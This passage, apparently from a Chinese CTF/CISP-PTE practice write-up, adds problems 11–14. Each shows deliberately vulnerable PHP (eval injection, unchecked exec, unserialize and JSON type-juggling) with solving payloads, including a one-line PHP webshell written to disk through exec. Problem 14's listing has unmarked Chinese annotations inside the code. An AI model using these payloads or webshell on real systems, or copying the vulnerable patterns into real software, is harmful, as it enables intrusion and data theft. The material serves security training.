@@ -504,3 +504,154 @@ echo base64_encode(serialize($user));
 ?>
 ```
 
+
+
+# 第11题 代码逃逸
+
+通过代码执行漏洞拿到key值
+
+```php
+<?php
+error_reporting(0);
+include "key4.php";
+$a=$_GET['a'];
+eval("\$o=strtolower(\"$a\");");
+echo $o;
+show_source(__FILE__);
+```
+
+## write up
+
+如果直接传递 ?a=phpinfo() 时,他并不能被执行,而是被包裹在字符串中,我们需要逃离字符串,例如使用以下payload:
+
+`");phpinfo();//`  
+
+这样就可以了,我们先读取key4.php文件,可以使用readfile() 函数或者echo file_get_contents()  或者show_source() 来读数据
+
+或者直接使用系统命令 system() 来读文件
+
+# 第12题
+
+请阅读代码，使用可能的利用方法，并找出可能存在flag的文件并读取flag。
+
+```php
+<?php
+error_reporting(0); 
+show_source(__FILE__);
+if(strlen($_GET[1]<30)){
+    echo strlen($_GET[1]);
+    echo exec($_GET[1]);
+}else{
+    exit('too more');
+}
+?>
+0
+```
+
+### write up
+
+PHP 的 `exec()` 函数，默认只返回命令执行结果的「最后一行」 ,所以这里使用find 还是grep 都不会看到数据,这里直接生成一句话木马
+
+```http
+?1=echo '<?php @eval($_REQUEST[1]);?>'>web.php
+```
+
+直接使用webshell连接器连接就可以了
+
+# 第13题
+
+简单的反序列的问题
+
+```php
+<?php
+error_reporting(0);
+include "flag.php";
+$TEMP = "CISP";
+$str = $_GET['str'];
+if (unserialize($str) === $TEMP)
+{
+    echo "$flag";
+}
+show_source(__FILE__);
+```
+
+## write up
+
+记不住反序列化后的字符怎么办, 使用攻防武器->找到phpstudy -> 找到设置-> 点击文件位置-> 点击php -> 进去里面写代码,比如:
+
+```php
+<?php
+$str="CISP";
+echo base64_encode(serialize($str));
+?>
+```
+
+然后在这个文件夹里面,打开命令行工具,如下:
+
+```cmd
+>php 文件名.php
+
+```
+
+就可以了,为什么用base64_encode 一下,是怕 命令行窗口不显示一些字符
+
+然后到编码工具里找小厨师,转码完成为这样的:
+
+```php
+s:4:"CISP";
+```
+
+然后提交就可以了
+
+
+
+# 第14题
+
+```php
+<?php
+$v1 = 0;
+$v2 = 0;
+首先w 需要是一个json对象,然后被转换成数组
+$a = (array)json_decode(@$_GET['w']);
+if (is_array($a)) {
+    w中的bar1不能是数字,也不能纯数字的字符
+    is_numeric(@$a["bar1"]) ? die("nope") : NULL;
+    if (@$a["bar1"]) {
+          w中的bar1应该是字符形式的,并且要大于2020
+        ($a["bar1"] > 2020) ? $v1 = 1 : NULL;
+    }
+     w中的bar2需要是一个数组
+    if (is_array(@$a["bar2"])) {
+         w中的bar2需要是一个数组,数组数量要等于5个,第一个还得是数组
+        if (count($a["bar2"]) != 5 or !is_array($a["bar2"][0])) {
+            die("nope");
+        }
+        
+        $pos = array_search("cisp-pte", $a["bar3"]);
+        $pos === false ? die("nope") : NULL;
+        foreach ($a["bar2"] as $key => $val) {
+            $val == "cisp-pte" ? die("nope") : NULL;
+        }
+        $v2 = 1;
+    }
+}
+if ($v1 && $v2) {
+    include "key.php";
+    echo $key;
+}
+highlight_file(__file__);
+?>
+```
+
+## write up
+
+还需要阅读代码,有点难,慢慢写
+
+```
+{
+"bar1":"2021abc",
+"bar2":[[1],2,3,4,5],
+"bar3":["cisp-pte"]
+}
+```
+
